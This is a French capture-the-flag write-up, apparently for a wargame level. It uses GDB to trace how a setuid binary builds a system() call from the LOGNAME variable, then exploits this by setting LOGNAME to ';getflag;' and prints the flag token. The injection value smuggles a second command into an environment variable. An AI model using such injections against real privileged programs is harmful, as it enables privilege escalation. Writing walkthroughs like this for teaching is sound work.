## Level 07: 
  
1. 
    Suite au login, on remarque un fichier executable:
    ```bash
    ./level07
    ```
    Output:
    ```bash 
    level07
    ```
    Il affiche simplement le nom du programme. Il va donc falloir examiner et analyser le code source.  
2.  Analyse du code source  
    Pour analyser le code source nous allons utiliser GDB. GDB (GNU Debugger) est un outil utilisé pour déboguer les programmes en C, C++, et d'autres langages compilés.  
    On va utiliser les commandes gdb suivantes:
    ```bash
    gdb ./level07
    (gdb) info functions   # Liste les fonctions du binaire  
    (gdb) break main       # Ajoute un point d'arrêt sur la fonction main  
    (gdb) run              # Exécute le programme jusqu'au point d'arrêt  
    (gdb) disassemble main # Désassemble la fonction main
    ```

    ```bash
    (gdb) info functions   # Liste les fonctions du binaire 
    ```
    Output:
    ```bash
    Non-debugging symbols:
    0x08048384  _init                   
    0x080483d0  setresuid               
    0x080483d0  setresuid@plt           
    0x080483e0  geteuid                 
    0x080483e0  geteuid@plt             
    0x080483f0  getegid                 
    0x080483f0  getegid@plt             
    0x08048400  getenv                  
    0x08048400  getenv@plt              
    0x08048410  system                  
    0x08048410  system@plt              
    0x08048420  __gmon_start__          
    0x08048420  __gmon_start__@plt      
    0x08048430  __libc_start_main       
    0x08048430  __libc_start_main@plt   
    0x08048440  asprintf                
    0x08048440  asprintf@plt            
    0x08048450  setresgid               
    0x08048450  setresgid@plt           
    0x08048460  _start                  
    0x08048490  __do_global_dtors_aux   
    0x080484f0  frame_dummy             
    0x080485b0  __libc_csu_init         
    0x08048620  __libc_csu_fini         
    0x08048622  __i686.get_pc_thunk.bx  
    0x08048630  __do_global_ctors_aux   
    0x0804865c  _fini                   
    ```
    Ici, 2 fonctions utilisées nous intéresse: `getenv`, `system`.  
    ```bash
    (gdb) disassemble main   # Liste les fonctions du binaire 
    ```
    Output:
    ```bash
    Dump of assembler code for function main:                  
    0x08048514 <+0>:     push   %ebp                        
    0x08048515 <+1>:     mov    %esp,%ebp                   
    0x08048517 <+3>:     and    $0xfffffff0,%esp            
    0x0804851a <+6>:     sub    $0x20,%esp                  
    0x0804851d <+9>:     call   0x80483f0 <getegid@plt>     
    0x08048522 <+14>:    mov    %eax,0x18(%esp)             
    0x08048526 <+18>:    call   0x80483e0 <geteuid@plt>     
    0x0804852b <+23>:    mov    %eax,0x1c(%esp)             
    0x0804852f <+27>:    mov    0x18(%esp),%eax             
    0x08048533 <+31>:    mov    %eax,0x8(%esp)              
    0x08048537 <+35>:    mov    0x18(%esp),%eax             
    0x0804853b <+39>:    mov    %eax,0x4(%esp)              
    0x0804853f <+43>:    mov    0x18(%esp),%eax             
    0x08048543 <+47>:    mov    %eax,(%esp)                 
    0x08048546 <+50>:    call   0x8048450 <setresgid@plt>   
    0x0804854b <+55>:    mov    0x1c(%esp),%eax             
    0x0804854f <+59>:    mov    %eax,0x8(%esp)              
    0x08048553 <+63>:    mov    0x1c(%esp),%eax             
    0x08048557 <+67>:    mov    %eax,0x4(%esp)              
    0x0804855b <+71>:    mov    0x1c(%esp),%eax             
    0x0804855f <+75>:    mov    %eax,(%esp)                 
    0x08048562 <+78>:    call   0x80483d0 <setresuid@plt>   
    0x08048567 <+83>:    movl   $0x0,0x14(%esp)             
    0x0804856f <+91>:    movl   $0x8048680,(%esp)           
    0x08048576 <+98>:    call   0x8048400 <getenv@plt>      
    0x0804857b <+103>:   mov    %eax,0x8(%esp)              
    0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)        
    0x08048587 <+115>:   lea    0x14(%esp),%eax             
    0x0804858b <+119>:   mov    %eax,(%esp)                 
    0x0804858e <+122>:   call   0x8048440 <asprintf@plt>    
    0x08048593 <+127>:   mov    0x14(%esp),%eax             
    0x08048597 <+131>:   mov    %eax,(%esp)                 
    0x0804859a <+134>:   call   0x8048410 <system@plt>      
    0x0804859f <+139>:   leave                              
    0x080485a0 <+140>:   ret                             
    End of assembler dump.                                  
    ```
    Ici, en analysant la fonction main, on comprend qu'un appel a `getenv`permet de récupérer la valeur d'une variable d'environnement à l'adresse: `0x8048680`:
    ```bash
    0x0804856f <+91>:    movl   $0x8048680,(%esp)           
    0x08048576 <+98>:    call   0x8048400 <getenv@plt>      
    0x0804857b <+103>:   mov    %eax,0x8(%esp)  
    ```  
    en analysant la suite du code désassemblé, on comprend que la valeur de la variable d'environnement est utilisée pour construire une commande avec `asprintf` en la combinant à une chaîne de format située a l'adresse `0x8048688`:
    ```bash
    0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)        
    0x08048587 <+115>:   lea    0x14(%esp),%eax             
    0x0804858b <+119>:   mov    %eax,(%esp)                 
    0x0804858e <+122>:   call   0x8048440 <asprintf@plt>    
    0x08048593 <+127>:   mov    0x14(%esp),%eax             
    ```
    Enfin, cette chaîne est ensuite éxecutée par un à la fonction `system`.  
    On peut connaître la valeur de la variable d'environnement ainsi que celle de la chaîne de format à laquelle elle est combinée par `asprintf`de la manière suivante:
    - Pour la variable d'environnement:
    ```bash
    (gdb) x/s 0x8048680
    ```
    Output:
    ```bash
    0x8048680:       "LOGNAME"  
    ```
    - Pour la chaîne de format:
    ```bash
    (gdb) x/s 0x8048688
    ``` 
    Ouput: 
    ```bash
    0x8048688:       "/bin/echo %s " 
    ```
    Ainsi, l'appel à la fonction `system` se fait avec comme argument : `/bin/echo $LOGNAME`.
  
3. Exploitation de la faille  
    Suite a l'analyse du code désassemblé, une faille se présente à nous: il suffit de modifier la valeur de la variable d'environnement `LOGNAME` par `;getflag;`:
    ```bash
    export LOGNAME=";getflag;"
    ```
    Enfin, il suffit d'éxecuter le programme `level07`.
    Output:
    ```bash
    Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
    ```